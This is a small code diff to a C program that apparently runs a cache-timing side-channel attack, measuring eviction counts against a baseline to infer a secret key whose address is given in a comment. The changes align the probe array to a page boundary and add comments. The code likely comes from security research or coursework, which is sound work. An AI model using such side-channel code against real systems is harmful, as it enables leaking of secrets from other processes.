@@ -21,11 +21,12 @@
 #define EVICTION_THRESHOLD 5
 // ADDRESS SECRET_KEY[0] -> 0x555555556008
 
-unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
+unsigned int probe_array[PROBE_ARR_SIZE] __attribute__((aligned(4096)));; // allocates int array of size = L1_SIZE and aligns to page
 CURL *curl_handle;
 
 uint64_t c_threshold;
 int main(int argc, char* argv[]) {
+    // printf("INT SIZE: %ld bytes\n", sizeof(int)); int size is 4 bytes
     // find threshold
     c_threshold = cache_threshold();
 
@@ -80,9 +81,9 @@ int main(int argc, char* argv[]) {
         printf("\n===== Eviction Difs =====\n");
         for (int i = 0; i < SETS; i++) {
             // get avg misses for each attack run
-            float avg_baseline = baseline[i] / ATTACK_RUNS;
+            float avg_baseline = baseline[i] / ATTACK_RUNS; // happens ATTACK_RUNS * 100 times -> attacks are only done 100 times
         
-            float diff = (float)count[i] - avg_baseline;
+            float diff = (float)count[i] - avg_baseline; 
 
             // if attack increased eviction more than threshold
             if (diff > EVICTION_THRESHOLD) { 
